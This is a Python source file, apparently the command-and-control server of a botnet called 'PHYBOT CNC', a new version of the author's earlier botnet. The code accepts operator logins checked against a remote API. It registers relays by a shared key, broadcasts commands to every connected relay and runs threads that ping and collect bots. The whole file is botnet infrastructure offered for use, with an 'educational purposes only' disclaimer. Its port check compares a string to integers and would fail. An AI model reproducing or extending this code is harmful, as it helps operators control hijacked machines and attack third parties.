#!/usr/bin/python3

import hashlib
from socket import socket as Sock
from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
from threading import Thread
from sys import argv, exit
import time
from colorama import Fore, init as colorama_init
from requests import get as rget
from modules.config import C2Config
from modules.loops import Loops
from modules.client import Client



__filename__="cnc"
__version__="3.0"
__author__="4lxprime"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
__infos__="This is a 'new version' of my old botnet B0T4N3T"



config: C2Config = C2Config(True)
config.setbanner("""
            dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
           dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
          dMMMMP"    dMMMMMP     VMMMMP     dMMMMK"   dMP dMP    dMP
         dMP        dMP dMP    dA .dMP     dMP.aMF   dMP.aMP    dMP
        dWP        dEP dAP     VREAP"     dNONYP"    VMOUP"    dSP

                    C                N                C
""")

def log(
    data: str,
) -> None: 
    if config.debug: print(data)

def send(
    s: Sock,
    data: str,
    escape=True,
    reset=True,
) -> None:
    if reset: data += config.COLOR_RESET
    if escape: data += '\r\n'

    s.send(data.encode())

def broadcast(
    data: str,
) -> None:
    log(f"send {data}")

    for relay in config.relay_list.keys():
        try: send(relay, f'{data}', False, False)
        except Exception:
            config.relay_list.pop(relay)
            relay.close()

def find_login(
    username: str,
    password: str,
) -> bool:
    password: str = hashlib.sha256(password.encode()).hexdigest()

    url: str = f"{config.API_URL}/login.php?urlkey={config.URL_KEY}&usr={username}&pass={password}"
    log(f"\n\n{url}\n\n\n\n")
    res: str = rget(url, timeout=5000).json()

    return res == "ok"


def handle_client(client, address) -> None:
    while 1:
        send(client, config.ANSI_CLEAR, False)
        send(client, f'{config.COLOR_WHITE}Username > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, config.ANSI_CLEAR, False)
        send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)

        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()

        break

    if password != config.RELAY_KEY:
        send(client, config.ANSI_CLEAR, False)

        if not find_login(username, password):
            send(client, f'{config.COLOR_RED}[{config.COLOR_WHITE}!{config.COLOR_RED}]{config.COLOR_RESET} Invalid credentials')
            time.sleep(1)
            client.close()
            return

        client_loops: Client = Client(config=config)

        Thread(target=client_loops.update_title, args=[client, username],).start()
        Thread(target=client_loops.command_line, args=[client, username],).start()
        
    else:
        for x in config.relay_list.values():
            if x[0] == address[0]:
                client.close()
                return

        config.relay_list.update({client: address})



def main():
    port: int = None

    if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT

    else:
        if len(argv) != 2:
            log(f'Usage: py {argv[0]} <c&c port>')
            exit()

        port = argv[1]
        if not port.isdigit() or port < 1 or port > 65535:
            log('Invalid C2 port')
            exit()

    colorama_init(convert=True)

    s: Sock = Sock()
    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try: s.bind(('0.0.0.0', port))

    except Exception:
        log('Failed to bind port')
        exit()

    loops: Loops = Loops(config=config)

    if loops.relay_api({'ip': '', 'bots': ''}, True):
        pass
    else:
        log('Failed to relay api')
        exit()

    s.listen()

    Thread(target=loops.ping).start()
    Thread(target=loops.net).start()
    Thread(target=loops.getbot).start()


    while 1: Thread(target=handle_client, args=[*s.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()
